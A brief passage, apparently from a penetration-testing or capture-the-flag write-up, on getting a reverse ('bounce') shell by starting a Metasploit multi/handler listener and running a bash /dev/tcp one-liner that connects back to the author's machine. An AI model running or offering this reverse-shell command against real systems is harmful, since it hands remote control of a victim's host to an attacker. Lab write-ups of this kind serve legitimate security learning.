### Bounce Shell

To establish a bounce shell, I need to use its bash to establish a TCP connection to my machine.

I start Metasploit's `multi/handler`, set `LHOST` to my VPN address, and choose a listener port for `LPORT`.

The command to execute a bounce shell is as follows:

```bash
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

This will create a shell at my Metasploit. Now I can run all the commands without restrictions.
